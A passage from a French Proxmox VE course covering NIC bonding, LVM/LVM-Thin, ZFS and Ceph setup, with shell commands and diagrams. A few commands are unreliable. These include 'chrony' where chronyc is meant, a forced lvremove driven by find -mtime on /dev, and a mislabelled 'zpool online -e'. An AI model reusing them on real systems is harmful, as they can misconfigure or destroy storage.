# Configuration port-channel
interface Port-channel1
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,40

# Configuration interfaces membres
interface range GigabitEthernet0/1-2
 channel-group 1 mode active
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,40
```

**Configuration switch HP/Aruba :**

```bash
# Création du trunk LACP
trunk 1-2 trk1 lacp

# Configuration VLAN sur trunk
vlan 10,20,30,40 tagged trk1
```

### Hash policies et répartition de charge

La **hash policy** détermine comment les paquets sont répartis entre les interfaces du bond. Le choix de la politique impacte directement les performances et l'équilibrage de charge.

```
Politiques de hash disponibles :

layer2 (default)
├── Hash sur MAC source/destination
├── Répartition par machine
└── Risque de déséquilibre

layer2+3
├── Hash sur MAC + IP source/destination  
├── Meilleure répartition
└── Recommandé pour la plupart des cas

layer3+4
├── Hash sur IP + Port source/destination
├── Répartition optimale par flux
└── Idéal pour serveurs multi-services

encap2+3
├── Hash sur headers internes (tunnels)
├── Spécialisé pour VXLAN/GRE
└── Usage SDN avancé
```

**Configuration et test des hash policies :**

```bash
# Modification de la politique
echo layer3+4 > /sys/class/net/bond0/bonding/xmit_hash_policy

# Test de répartition
for i in {1..100}; do
    ping -c 1 192.168.1.$i &
done

# Monitoring répartition
watch -n 1 'cat /proc/net/bonding/bond0 | grep -A 2 "Slave Interface"'
```

### Monitoring et diagnostic bonding

**Surveillance de l'état du bond :**

```bash
# État détaillé du bond
cat /proc/net/bonding/bond0

# Statistiques par interface
cat /sys/class/net/bond0/statistics/rx_bytes
cat /sys/class/net/ens18/statistics/rx_bytes
cat /sys/class/net/ens19/statistics/rx_bytes

# Monitoring LACP
cat /proc/net/bonding/bond0 | grep -A 10 "802.3ad info"

# Test de failover
ip link set ens18 down
# Vérifier que le trafic continue sur ens19
ping -c 10 192.168.1.1
ip link set ens18 up
```

**Scripts de monitoring automatisé :**

```bash
#!/bin/bash
# Script de surveillance bond
BOND_INTERFACE="bond0"
ALERT_EMAIL="admin@company.com"

check_bond_status() {
    local bond_status=$(cat /proc/net/bonding/$BOND_INTERFACE | grep "MII Status" | head -1 | awk '{print $3}')
    local active_slaves=$(cat /proc/net/bonding/$BOND_INTERFACE | grep "Currently Active Slave" | awk '{print $4}')
    
    if [ "$bond_status" != "up" ]; then
        echo "ALERT: Bond $BOND_INTERFACE is DOWN" | mail -s "Bond Alert" $ALERT_EMAIL
    fi
    
    local slave_count=$(cat /proc/net/bonding/$BOND_INTERFACE | grep "Slave Interface" | wc -l)
    if [ $slave_count -lt 2 ]; then
        echo "WARNING: Bond $BOND_INTERFACE has only $slave_count active slave(s)" | mail -s "Bond Warning" $ALERT_EMAIL
    fi
}

# Exécution toutes les 5 minutes via cron
# */5 * * * * /usr/local/bin/check_bond.sh
```

### Optimisation des performances

**Tuning des paramètres bond :**

```bash
# Optimisation MII monitoring
echo 50 > /sys/class/net/bond0/bonding/miimon

# Délais optimisés
echo 100 > /sys/class/net/bond0/bonding/updelay
echo 100 > /sys/class/net/bond0/bonding/downdelay

# LACP rate rapide
echo fast > /sys/class/net/bond0/bonding/lacp_rate
```

**Optimisation réseau globale :**

```bash
# Augmentation des buffers réseau
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.netdev_max_backlog = 5000' >> /etc/sysctl.conf

# Optimisation TCP
echo 'net.ipv4.tcp_window_scaling = 1' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_timestamps = 1' >> /etc/sysctl.conf

# Application des paramètres
sysctl -p
```

### Cas d'usage spécialisés

**Infrastructure de production :** Implémentez du bonding LACP sur tous les serveurs critiques avec monitoring proactif. Utilisez la hash policy layer3+4 pour optimiser la répartition des flux applicatifs.

**Stockage haute performance :** Configurez des bonds dédiés pour le trafic de stockage (iSCSI, NFS) avec des VLAN isolés. Utilisez des interfaces 10GbE ou plus pour éviter les goulots d'étranglement.

**Laboratoire de test :** Utilisez le mode active-backup pour simplifier la configuration tout en conservant la redondance. Testez différents modes de bonding pour comprendre leur impact sur les performances applicatives.

---


# Module 4 : Stockage

## 4.1 Stockage local vs distribué

### Philosophies du stockage moderne

Le choix entre stockage local et distribué représente une décision architecturale fondamentale qui impacte performance, disponibilité, coût et complexité de votre infrastructure. Cette décision ressemble au choix entre **posséder sa propre voiture** (stockage local) ou **utiliser un service de transport partagé** (stockage distribué) : chaque approche a ses avantages selon le contexte d'utilisation.

Le stockage local offre des performances maximales et une simplicité de gestion, mais crée des silos de données et des points de défaillance unique. Le stockage distribué apporte redondance, scalabilité et flexibilité, au prix d'une complexité accrue et de performances potentiellement réduites.

### Architecture de stockage local

```
Stockage Local - Architecture Node :

┌─────────────────────────────────────────────┐
│              Serveur Proxmox                │
├─────────────────────────────────────────────┤
│                   VMs                       │
│  ┌─────────┐ ┌─────────┐ ┌─────────┐       │
│  │ VM 101  │ │ VM 102  │ │ VM 103  │       │
│  │ 50 GB   │ │ 100 GB  │ │ 75 GB   │       │
│  └─────────┘ └─────────┘ └─────────┘       │
├─────────────────────────────────────────────┤
│            Hyperviseur (Proxmox)            │
│  ┌─────────────────────────────────────────┐│
│  │         LVM / ZFS / ext4            ││
│  └─────────────────────────────────────────┘│
├─────────────────────────────────────────────┤
│              Stockage Physique              │
│  ┌─────────┐ ┌─────────┐ ┌─────────┐       │
│  │ SSD 1   │ │ SSD 2   │ │ HDD 1   │       │
│  │ 500 GB  │ │ 500 GB  │ │ 2 TB    │       │
│  │ (OS)    │ │ (VMs)   │ │ (Backup)│       │
│  └─────────┘ └─────────┘ └─────────┘       │
└─────────────────────────────────────────────┘

Avantages :
✓ Performance maximale (accès direct)
✓ Latence prévisible (<1ms)
✓ Simplicité de configuration
✓ Coût réduit (pas d'infrastructure réseau)
✓ Isolation complète des données

Inconvénients :
✗ Pas de migration à chaud
✗ Point de défaillance unique
✗ Scalabilité limitée
✗ Gestion des sauvegardes complexe
✗ Utilisation inégale des ressources
```

### Architecture de stockage distribué

```
Stockage Distribué - Architecture Cluster :

Node 1                Node 2                Node 3
┌─────────────┐      ┌─────────────┐      ┌─────────────┐
│     VMs     │      │     VMs     │      │     VMs     │
├─────────────┤      ├─────────────┤      ├─────────────┤
│  Proxmox    │◄────►│  Proxmox    │◄────►│  Proxmox    │
├─────────────┤      ├─────────────┤      ├─────────────┤
│ Ceph OSD 1  │      │ Ceph OSD 2  │      │ Ceph OSD 3  │
│ 1TB SSD     │      │ 1TB SSD     │      │ 1TB SSD     │
└─────────────┘      └─────────────┘      └─────────────┘
       │                     │                     │
       └─────────────────────┼─────────────────────┘
                             │
                    ┌─────────────┐
                    │ Pool Ceph   │
                    │ 3TB total   │
                    │ Réplication │
                    │ 3 copies    │
                    │ 1TB utile   │
                    └─────────────┘

Avantages :
✓ Haute disponibilité (pas de SPOF)
✓ Migration à chaud des VMs
✓ Scalabilité horizontale
✓ Auto-réparation des données
✓ Gestion centralisée

Inconvénients :
✗ Latence réseau (2-10ms)
✗ Complexité de configuration
✗ Overhead de réplication
✗ Dépendance réseau
✗ Coût infrastructure élevé
```

### Comparaison des technologies de stockage

```
Matrice de comparaison stockage :

Technologie    │Performance│Disponibilité│Complexité│Coût│Usage optimal
───────────────┼───────────┼─────────────┼──────────┼────┼─────────────
Local SSD      │    ★★★★★  │     ★       │    ★     │ ★★ │Dev/Test/Edge
Local NVMe     │    ★★★★★  │     ★       │    ★     │ ★★★│HPC/Database
iSCSI SAN      │    ★★★★   │    ★★★★     │   ★★★    │★★★★│Enterprise
NFS            │    ★★★    │    ★★★      │   ★★     │ ★★ │Partage fichiers
Ceph RBD       │    ★★★    │    ★★★★★    │   ★★★★★  │ ★★ │Cloud/Scale-out
GlusterFS      │    ★★     │    ★★★★     │   ★★★★   │ ★  │Archive/Backup
```

### Stockage hybride : Le meilleur des deux mondes

Une approche hybride combine stockage local pour les performances critiques et stockage distribué pour la redondance et la flexibilité.

**Architecture hybride recommandée :**

```bash
# Stockage local pour :
# - OS des VMs (boot rapide)
# - Bases de données (latence critique)
# - Logs temporaires
local-lvm: /dev/sda (SSD 500GB)

# Stockage distribué pour :
# - Images ISO/templates
# - Sauvegardes
# - VMs non-critiques
ceph: pool production (réplication 3)

# Configuration Proxmox
pvesm add lvm local-lvm --vgname pve --content images
pvesm add ceph ceph-storage --pool production --content images,backup
```

### Tiering de stockage

Le **tiering** organise les données selon leur fréquence d'accès et leur criticité, optimisant le rapport performance/coût.

```
Pyramide de tiering :

Tier 0 (Hot) - NVMe SSD
├── Données critiques haute fréquence
├── Bases de données actives
├── Logs en temps réel
└── Coût : ★★★★★ | Performance : ★★★★★

Tier 1 (Warm) - SATA SSD  
├── VMs de production
├── Applications métier
├── Données fréquemment accédées
└── Coût : ★★★ | Performance : ★★★★

Tier 2 (Cold) - HDD 7200 RPM
├── Archives récentes
├── Sauvegardes
├── Données peu fréquentes
└── Coût : ★★ | Performance : ★★

Tier 3 (Archive) - HDD 5400 RPM / Tape
├── Archives long terme
├── Compliance/Audit
├── Données rarement accédées
└── Coût : ★ | Performance : ★
```

**Implémentation automatique du tiering :**

```bash
# ZFS avec tiering automatique
zpool create storage \
    special mirror /dev/nvme0n1 /dev/nvme1n1 \
    mirror /dev/sda /dev/sdb \
    cache /dev/nvme2n1

# Règles de placement automatique
zfs set special_small_blocks=32K storage
zfs set primarycache=metadata storage
```

### Métriques de performance stockage

**IOPS (Input/Output Operations Per Second)** mesure le nombre d'opérations de lecture/écriture par seconde. Cette métrique est cruciale pour les bases de données et applications transactionnelles.

**Latence** représente le temps de réponse d'une opération I/O. Une latence faible est critique pour les applications interactives.

**Débit (Throughput)** mesure la quantité de données transférées par unité de temps, important pour les applications de streaming ou de sauvegarde.

```bash
# Benchmark complet avec fio
fio --name=random-read --ioengine=libaio --rw=randread --bs=4k --size=1G --numjobs=4 --runtime=60 --group_reporting
fio --name=random-write --ioengine=libaio --rw=randwrite --bs=4k --size=1G --numjobs=4 --runtime=60 --group_reporting
fio --name=sequential-read --ioengine=libaio --rw=read --bs=1M --size=1G --numjobs=1 --runtime=60 --group_reporting
fio --name=sequential-write --ioengine=libaio --rw=write --bs=1M --size=1G --numjobs=1 --runtime=60 --group_reporting

# Monitoring en temps réel
iostat -x 1
iotop -o
```

---

## 4.2 LVM et LVM-Thin

### Logical Volume Manager (LVM)

**LVM** révolutionne la gestion du stockage en introduisant une couche d'abstraction entre le stockage physique et les systèmes de fichiers. Cette abstraction permet de redimensionner, déplacer et gérer les volumes de manière flexible, sans interruption de service.

Imaginez LVM comme un **gestionnaire immobilier intelligent** qui peut redistribuer l'espace entre différents locataires (volumes logiques) selon leurs besoins, agrandir ou réduire les appartements (redimensionnement), et même déménager des locataires vers de nouveaux bâtiments (migration) sans interruption.

### Architecture LVM

```
Architecture LVM complète :

Disques Physiques
┌─────────┐ ┌─────────┐ ┌─────────┐
│ /dev/sda│ │ /dev/sdb│ │ /dev/sdc│
│ 1TB SSD │ │ 1TB SSD │ │ 2TB HDD │
└─────────┘ └─────────┘ └─────────┘
     │           │           │
     ▼           ▼           ▼
Physical Volumes (PV)
┌─────────┐ ┌─────────┐ ┌─────────┐
│   PV1   │ │   PV2   │ │   PV3   │
│ 1TB SSD │ │ 1TB SSD │ │ 2TB HDD │
└─────────┘ └─────────┘ └─────────┘
     │           │           │
     └───────────┼───────────┘
                 ▼
Volume Group (VG)
┌─────────────────────────────────┐
│            vg-storage           │
│         4TB total space         │
│    ┌─────────┬─────────────┐    │
│    │ SSD Pool│  HDD Pool   │    │
│    │  2TB    │    2TB      │    │
│    └─────────┴─────────────┘    │
└─────────────────────────────────┘
                 │
     ┌───────────┼───────────┐
     ▼           ▼           ▼
Logical Volumes (LV)
┌─────────┐ ┌─────────┐ ┌─────────┐
│ lv-vm1  │ │ lv-vm2  │ │lv-backup│
│ 100GB   │ │ 200GB   │ │ 500GB   │
│ (SSD)   │ │ (SSD)   │ │ (HDD)   │
└─────────┘ └─────────┘ └─────────┘
     │           │           │
     ▼           ▼           ▼
Systèmes de fichiers
┌─────────┐ ┌─────────┐ ┌─────────┐
│  ext4   │ │  xfs    │ │  ext4   │
└─────────┘ └─────────┘ └─────────┘
```

### Configuration LVM de base

**Création d'une infrastructure LVM complète :**

```bash
# 1. Préparation des disques
# Création des partitions (optionnel, peut utiliser disques entiers)
fdisk /dev/sda
# Créer partition type 8e (Linux LVM)

# 2. Création des Physical Volumes
pvcreate /dev/sda1 /dev/sdb1 /dev/sdc1

# Vérification
pvdisplay
pvs

# 3. Création du Volume Group
vgcreate vg-storage /dev/sda1 /dev/sdb1 /dev/sdc1

# Vérification
vgdisplay vg-storage
vgs

# 4. Création des Logical Volumes
lvcreate -L 100G -n lv-vm1 vg-storage
lvcreate -L 200G -n lv-vm2 vg-storage
lvcreate -L 500G -n lv-backup vg-storage

# Vérification
lvdisplay
lvs

# 5. Création des systèmes de fichiers
mkfs.ext4 /dev/vg-storage/lv-vm1
mkfs.xfs /dev/vg-storage/lv-vm2
mkfs.ext4 /dev/vg-storage/lv-backup
```

### LVM-Thin : Provisioning à la demande

**LVM-Thin** introduit le concept de **thin provisioning** : allouer de l'espace logique sans consommer immédiatement l'espace physique. Cette technique permet de sur-allouer l'espace disque et de ne consommer l'espace réel qu'au fur et à mesure des écritures.

**Avantages du thin provisioning :**
- **Économie d'espace** : Allocation à la demande
- **Snapshots efficaces** : Partage des blocs communs
- **Flexibilité** : Redimensionnement dynamique
- **Optimisation** : Élimination des zéros

```
Architecture LVM-Thin :

Volume Group (VG)
┌─────────────────────────────────────────┐
│              vg-storage                 │
│                2TB total                │
│  ┌─────────────────────────────────────┐│
│  │         Thin Pool                   ││
│  │        pool-storage                 ││
│  │         1.8TB alloué                ││
│  │  ┌─────────┬─────────┬─────────┐    ││
│  │  │ Thin LV │ Thin LV │ Thin LV │    ││
│  │  │ vm1-100G│ vm2-200G│ vm3-150G│    ││
│  │  │ (30G    │ (80G    │ (45G    │    ││
│  │  │ utilisé)│ utilisé)│ utilisé)│    ││
│  │  └─────────┴─────────┴─────────┘    ││
│  └─────────────────────────────────────┘│
└─────────────────────────────────────────┘

Allocation logique : 450GB
Utilisation réelle : 155GB
Ratio overcommit : 2.9x
```

**Configuration LVM-Thin :**

```bash
# 1. Création du thin pool
lvcreate -L 1.8T --thinpool pool-storage vg-storage

# 2. Configuration des paramètres thin
lvchange --zero n vg-storage/pool-storage
lvchange --discards passdown vg-storage/pool-storage

# 3. Création de volumes thin
lvcreate -V 100G --thin vg-storage/pool-storage -n vm1-disk
lvcreate -V 200G --thin vg-storage/pool-storage -n vm2-disk
lvcreate -V 150G --thin vg-storage/pool-storage -n vm3-disk

# 4. Monitoring de l'utilisation
lvs -o+data_percent,metadata_percent vg-storage
```

### Snapshots LVM et LVM-Thin

Les **snapshots** créent des copies instantanées d'un volume à un moment donné, permettant sauvegardes cohérentes et tests sans risque.

**Snapshots LVM traditionnels :**

```bash
# Création snapshot traditionnel
lvcreate -L 10G -s -n vm1-snapshot /dev/vg-storage/lv-vm1

# Le snapshot consomme de l'espace pour stocker les différences
# Taille recommandée : 10-20% du volume original
```

**Snapshots LVM-Thin (recommandés) :**

```bash
# Snapshot thin (instantané, pas de pré-allocation)
lvcreate -s vg-storage/vm1-disk -n vm1-snapshot-$(date +%Y%m%d)

# Avantages :
# - Création instantanée
# - Pas de pré-allocation d'espace
# - Partage des blocs communs
# - Snapshots multiples efficaces

# Gestion des snapshots
lvs -o+origin,snap_percent vg-storage
```

### Redimensionnement et migration

**Redimensionnement à chaud :**

```bash
# Agrandissement d'un volume (à chaud)
lvextend -L +50G /dev/vg-storage/lv-vm1
resize2fs /dev/vg-storage/lv-vm1  # ext4
xfs_growfs /mount/point            # xfs

# Réduction (nécessite démontage pour ext4)
umount /mount/point
e2fsck -f /dev/vg-storage/lv-vm1
resize2fs /dev/vg-storage/lv-vm1 80G
lvreduce -L 80G /dev/vg-storage/lv-vm1
mount /dev/vg-storage/lv-vm1 /mount/point
```

**Migration de volumes :**

```bash
# Ajout d'un nouveau disque au VG
pvcreate /dev/sdd1
vgextend vg-storage /dev/sdd1

# Migration des données vers le nouveau disque
pvmove /dev/sda1 /dev/sdd1

# Retrait de l'ancien disque
vgreduce vg-storage /dev/sda1
pvremove /dev/sda1
```

### Monitoring et maintenance LVM

**Surveillance de l'espace thin :**

```bash
# Script de monitoring thin pools
#!/bin/bash
THRESHOLD=80

for pool in $(lvs --noheadings -o lv_name,pool_lv | grep -v "^\s*$" | awk '{print $1}'); do
    usage=$(lvs --noheadings -o data_percent $pool | tr -d ' %')
    if [ ${usage%.*} -gt $THRESHOLD ]; then
        echo "WARNING: Thin pool $pool is ${usage}% full"
        # Alertes ou actions automatiques
    fi
done
```

**Maintenance préventive :**

```bash
# Nettoyage des snapshots anciens
find /dev/vg-storage -name "*snapshot*" -mtime +7 -exec lvremove -f {} \;

# Optimisation thin pool
fstrim -v /mount/points  # TRIM sur SSD
lvchange --discards passdown vg-storage/pool-storage

# Vérification intégrité
vgck vg-storage
```

### Cas d'usage spécialisés

**Infrastructure de développement :** Utilisez LVM-Thin avec snapshots fréquents pour créer rapidement des environnements de test. Configurez des scripts automatisés pour créer/détruire des snapshots avant/après les déploiements.

**Sauvegarde cohérente :** Créez des snapshots LVM avant les sauvegardes pour garantir la cohérence des données, particulièrement important pour les bases de données.

**Laboratoire de cybersécurité :** Exploitez les snapshots pour revenir rapidement à un état propre entre les tests. Configurez des templates avec snapshots pour déployer instantanément des environnements d'attaque standardisés.

---

## 4.3 ZFS

### ZFS : Le système de fichiers révolutionnaire

**ZFS (Zettabyte File System)** représente une révolution dans la gestion du stockage en combinant gestionnaire de volumes, système de fichiers, et fonctionnalités RAID dans une solution intégrée. Développé par Sun Microsystems, ZFS apporte des fonctionnalités avancées : intégrité des données garantie, snapshots instantanés, compression transparente, et déduplication.

Imaginez ZFS comme un **coffre-fort intelligent** qui non seulement stocke vos biens précieux, mais vérifie continuellement leur intégrité, crée automatiquement des copies de sauvegarde, et optimise l'espace de stockage en éliminant les doublons.

### Architecture ZFS

```
Architecture ZFS complète :

                    ZFS Pool (zpool)
┌─────────────────────────────────────────────────────┐
│                   tank (2TB)                        │
│  ┌─────────────────────────────────────────────────┐│
│  │              Virtual Devices (vdev)             ││
│  │  ┌─────────────┐  ┌─────────────┐              ││
│  │  │   Mirror    │  │    RAIDZ    │              ││
│  │  │ ┌─────────┐ │  │ ┌─────────┐ │              ││
│  │  │ │ Disk A  │ │  │ │ Disk C  │ │              ││
│  │  │ │ 500GB   │ │  │ │ 500GB   │ │              ││
│  │  │ └─────────┘ │  │ └─────────┘ │              ││
│  │  │ ┌─────────┐ │  │ ┌─────────┐ │              ││
│  │  │ │ Disk B  │ │  │ │ Disk D  │ │              ││
│  │  │ │ 500GB   │ │  │ │ 500GB   │ │              ││
│  │  │ └─────────┘ │  │ └─────────┘ │              ││
│  │  └─────────────┘  └─────────────┘              ││
│  └─────────────────────────────────────────────────┘│
│                                                     │
│  ┌─────────────────────────────────────────────────┐│
│  │                Datasets                         ││
│  │  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐││
│  │  │tank/vm-disks│ │tank/backups │ │tank/iso     │││
│  │  │ 800GB       │ │ 600GB       │ │ 100GB       │││
│  │  │compression  │ │deduplication│ │ readonly    │││
│  │  └─────────────┘ └─────────────┘ └─────────────┘││
│  └─────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────┘

Fonctionnalités intégrées :
✓ Checksums sur toutes les données
✓ Auto-réparation (self-healing)
✓ Snapshots instantanés
✓ Compression transparente
✓ Déduplication
✓ Chiffrement natif
```

### Types de vdev et niveaux RAID

**Mirror** : Réplication exacte des données sur 2+ disques

```bash
# Création pool avec mirror
zpool create tank mirror /dev/sda /dev/sdb

# Avantages :
# - Performance lecture excellente
# - Tolérance panne : n-1 disques
# - Reconstruction rapide

# Inconvénients :
# - Efficacité stockage : 50%
# - Coût élevé
```

**RAIDZ1** : Équivalent RAID5 avec 1 disque de parité

```bash
# Création pool RAIDZ1 (minimum 3 disques)
zpool create tank raidz1 /dev/sda /dev/sdb /dev/sdc

# Avantages :
# - Efficacité stockage : (n-1)/n
# - Tolérance : 1 disque
# - Coût modéré

# Inconvénients :
# - Performance écriture réduite
# - Reconstruction lente
# - Risque pendant reconstruction
```

**RAIDZ2** : Équivalent RAID6 avec 2 disques de parité

```bash
# Création pool RAIDZ2 (minimum 4 disques)
zpool create tank raidz2 /dev/sda /dev/sdb /dev/sdc /dev/sdd

# Recommandé pour production :
# - Efficacité stockage : (n-2)/n
# - Tolérance : 2 disques
# - Sécurité élevée
```

### Configuration ZFS dans Proxmox

**Installation et configuration initiale :**

```bash
# ZFS est intégré dans Proxmox, configuration via interface web ou CLI

# Création pool ZFS
zpool create -o ashift=12 \
    -O compression=lz4 \
    -O atime=off \
    -O xattr=sa \
    -O dnodesize=auto \
    tank raidz2 /dev/sda /dev/sdb /dev/sdc /dev/sdd

# Optimisations pour virtualisation
zfs set primarycache=metadata tank
zfs set recordsize=64K tank
zfs set sync=disabled tank  # Attention : risque de perte de données

# Ajout du stockage dans Proxmox
pvesm add zfspool tank --pool tank --content images,rootdir
```

**Datasets et propriétés :**

```bash
# Création datasets spécialisés
zfs create tank/vm-disks
zfs create tank/backups
zfs create tank/templates

# Configuration propriétés par dataset
zfs set compression=lz4 tank/vm-disks
zfs set compression=gzip-9 tank/backups
zfs set dedup=on tank/backups
zfs set readonly=on tank/templates

# Quotas et réservations
zfs set quota=500G tank/vm-disks
zfs set reservation=100G tank/vm-disks
```

### Snapshots et clones ZFS

**Snapshots ZFS** sont instantanés, cohérents, et ne consomment de l'espace que pour les modifications ultérieures.

```bash
# Création snapshot
zfs snapshot tank/vm-disks@backup-$(date +%Y%m%d-%H%M)

# Liste des snapshots
zfs list -t snapshot

# Restauration depuis snapshot
zfs rollback tank/vm-disks@backup-20241201-1200

# Envoi snapshot vers autre système
zfs send tank/vm-disks@backup-20241201 | ssh remote-host zfs receive backup-tank/vm-disks

# Clonage (copie modifiable d'un snapshot)
zfs clone tank/vm-disks@backup-20241201 tank/vm-test
```

**Automatisation des snapshots :**

```bash
# Script de snapshots automatiques
#!/bin/bash
DATASET="tank/vm-disks"
RETENTION_DAYS=7

# Création snapshot
zfs snapshot ${DATASET}@auto-$(date +%Y%m%d-%H%M)

# Nettoyage anciens snapshots
for snap in $(zfs list -H -o name -t snapshot | grep ${DATASET}@auto- | head -n -${RETENTION_DAYS}); do
    zfs destroy $snap
done

# Crontab : snapshots toutes les 4 heures
# 0 */4 * * * /usr/local/bin/zfs-auto-snapshot.sh
```

### Compression et déduplication

**Compression ZFS** réduit l'espace utilisé sans impact significatif sur les performances grâce aux algorithmes optimisés.

```bash
# Algorithmes de compression disponibles
# lz4 : Rapide, ratio modéré (recommandé)
# gzip-1 à gzip-9 : Ratio élevé, plus lent
# zstd : Équilibre moderne

# Configuration compression
zfs set compression=lz4 tank/vm-disks
zfs set compression=zstd tank/backups

# Vérification efficacité
zfs get compressratio tank/vm-disks
```

**Déduplication** élimine les blocs de données identiques, particulièrement efficace pour les environnements avec beaucoup de données similaires.

```bash
# Activation déduplication (consomme beaucoup de RAM)
zfs set dedup=on tank/backups

# Vérification ratio déduplication
zpool get dedupratio tank

# Estimation RAM nécessaire : 1GB RAM pour 1TB de données dédupliquées
```

### Monitoring et maintenance ZFS

**Surveillance de l'état du pool :**

```bash
# État général du pool
zpool status tank

# Statistiques détaillées
zpool iostat tank 1

# Utilisation espace
zfs list -o space tank

# Vérification intégrité (scrub)
zpool scrub tank
zpool status tank  # Progression du scrub
```

**Maintenance préventive :**

```bash
# Scrub automatique mensuel
# 0 2 1 * * /sbin/zpool scrub tank

# Monitoring erreurs
zpool status | grep -E "(DEGRADED|FAULTED|OFFLINE|errors)"

# Remplacement disque défaillant
zpool replace tank /dev/sdb /dev/sde

# Optimisation fragmentation
zpool online -e tank /dev/sda  # Expansion après remplacement
```

### Optimisation des performances ZFS

**Paramètres de performance critiques :**

```bash
# ARC (Adaptive Replacement Cache) - RAM cache
echo 8589934592 > /sys/module/zfs/parameters/zfs_arc_max  # 8GB max

# Record size optimal selon usage
zfs set recordsize=128K tank/vm-disks    # VMs
zfs set recordsize=1M tank/backups      # Gros fichiers
zfs set recordsize=16K tank/databases   # Bases de données

# Optimisations SSD
zfs set primarycache=metadata tank  # Cache métadonnées uniquement
zfs set logbias=throughput tank     # Optimise débit vs latence
```

**L2ARC et ZIL sur SSD :**

```bash
# Ajout cache L2ARC (lecture)
zpool add tank cache /dev/nvme0n1p1

# Ajout ZIL/SLOG (écriture synchrone)
zpool add tank log /dev/nvme0n1p2

# Vérification
zpool status tank
```

### Cas d'usage spécialisés

**Infrastructure de production :** Configurez ZFS avec RAIDZ2 pour la redondance, compression lz4 pour l'efficacité, et snapshots automatiques pour la protection des données. Utilisez des SSD pour L2ARC et ZIL pour optimiser les performances.

**Environnement de sauvegarde :** Exploitez la déduplication et compression gzip-9 pour maximiser l'efficacité du stockage. Configurez la réplication ZFS vers un site distant pour la continuité d'activité.

**Laboratoire de développement :** Utilisez les clones ZFS pour créer rapidement des environnements de test identiques. Les snapshots permettent de revenir instantanément à un état stable après les tests.

---

## 4.4 Ceph et stockage distribué

### Ceph : Architecture du stockage software-defined

**Ceph** révolutionne le stockage distribué en éliminant les points de défaillance unique et en offrant une scalabilité quasi-illimitée. Cette solution software-defined transforme des serveurs standards en infrastructure de stockage enterprise-grade, capable de gérer des pétaoctets de données avec auto-réparation et répartition automatique.

Imaginez Ceph comme une **colonie de fourmis intelligentes** : chaque nœud (fourmi) connaît l'état global du cluster et peut prendre des décisions autonomes pour maintenir l'intégrité et la disponibilité des données, même si d'autres nœuds disparaissent.

### Architecture Ceph complète

```
Cluster Ceph 3 nœuds :

Node 1 (proxmox1)          Node 2 (proxmox2)          Node 3 (proxmox3)
┌─────────────────┐       ┌─────────────────┐       ┌─────────────────┐
│   Proxmox VE    │       │   Proxmox VE    │       │   Proxmox VE    │
├─────────────────┤       ├─────────────────┤       ├─────────────────┤
│ Ceph Monitor    │◄─────►│ Ceph Monitor    │◄─────►│ Ceph Monitor    │
│ (MON)           │       │ (MON)           │       │ (MON)           │
├─────────────────┤       ├─────────────────┤       ├─────────────────┤
│ Ceph Manager    │       │ Ceph Manager    │       │ Ceph Manager    │
│ (MGR)           │       │ (MGR) - Standby │       │ (MGR) - Standby │
├─────────────────┤       ├─────────────────┤       ├─────────────────┤
│ Ceph OSD.0      │       │ Ceph OSD.1      │       │ Ceph OSD.2      │
│ /dev/sdb (1TB)  │       │ /dev/sdb (1TB)  │       │ /dev/sdb (1TB)  │
├─────────────────┤       ├─────────────────┤       ├─────────────────┤
│ Ceph OSD.3      │       │ Ceph OSD.4      │       │ Ceph OSD.5      │
│ /dev/sdc (1TB)  │       │ /dev/sdc (1TB)  │       │ /dev/sdc (1TB)  │
└─────────────────┘       └─────────────────┘       └─────────────────┘
         │                         │                         │
         └─────────────────────────┼─────────────────────────┘
                                   │
                          ┌─────────────┐
                          │ Cluster Map │
                          │ ┌─────────┐ │
                          │ │ Pool RBD│ │
                          │ │ Size: 3 │ │
                          │ │ Min: 2  │ │
                          │ │ 6TB raw │ │
                          │ │ 2TB net │ │
                          │ └─────────┘ │
                          └─────────────┘

Composants Ceph :
┌──────────┬─────────────────────────────────────────┐
│ Monitor  │ Maintient la carte du cluster          │
│ (MON)    │ Consensus quorum (nombre impair)        │
├──────────┼─────────────────────────────────────────┤
│ Manager  │ Monitoring, métriques, interface web    │
│ (MGR)    │ Un actif, autres en standby             │
├──────────┼─────────────────────────────────────────┤
│ OSD      │ Stockage des données, réplication       │
│          │ Un par disque, auto-réparation          │
├──────────┼─────────────────────────────────────────┤
│ MDS      │ Métadonnées CephFS (optionnel)          │
│          │ Nécessaire uniquement pour CephFS       │
└──────────┴─────────────────────────────────────────┘
```

### Installation Ceph dans Proxmox

**Prérequis et préparation :**

```bash
# Vérification réseau (latence < 5ms recommandée)
ping -c 10 proxmox2
ping -c 10 proxmox3

# Synchronisation temps (critique pour Ceph)
systemctl enable --now chrony
chrony sources -v

# Préparation disques (effacement sécurisé)
wipefs -a /dev/sdb
wipefs -a /dev/sdc
```

**Installation via interface Proxmox :**

```bash
# 1. Initialisation cluster Ceph (nœud 1)
# Datacenter > Ceph > Install
# Configuration réseau dédié recommandée

# 2. Création monitors (quorum impair)
# Ceph > Monitor > Create
# Répéter sur les 3 nœuds

# 3. Création manager
# Ceph > Manager > Create

# 4. Création OSDs
# Ceph > OSD > Create
# Sélectionner disques /dev/sdb, /dev/sdc sur chaque nœud
```

**Installation CLI (alternative) :**

```bash
# Installation packages Ceph
apt update && apt install -y ceph-common

# Initialisation cluster
ceph-deploy new proxmox1 proxmox2 proxmox3

# Configuration ceph.conf
echo "osd pool default size = 3" >> ceph.conf
echo "osd pool default min size = 2" >> ceph.conf
echo "osd pool default pg num = 128" >> ceph.conf

# Déploiement monitors
ceph-deploy mon create-initial

# Déploiement OSDs
ceph-deploy osd create --data /dev/sdb proxmox1
ceph-deploy osd create --data /dev/sdc proxmox1
# Répéter pour proxmox2 et proxmox3

# Déploiement managers
ceph-deploy mgr create proxmox1 proxmox2 proxmox3
```

### Pools et Placement Groups

**Pools** organisent les données avec des règles de réplication et de placement spécifiques. Chaque pool définit sa stratégie de redondance et ses performances.

```bash
# Création pool pour VMs
ceph osd pool create vm-pool 128 128

# Configuration réplication
ceph osd pool set vm-pool size 3      # 3 copies
ceph osd pool set vm-pool min_size 2  # Minimum 2 copies pour écriture

# Activation RBD
ceph osd pool application enable vm-pool rbd

# Création pool pour sauvegardes (réplication réduite)
ceph osd pool create backup-pool 64 64
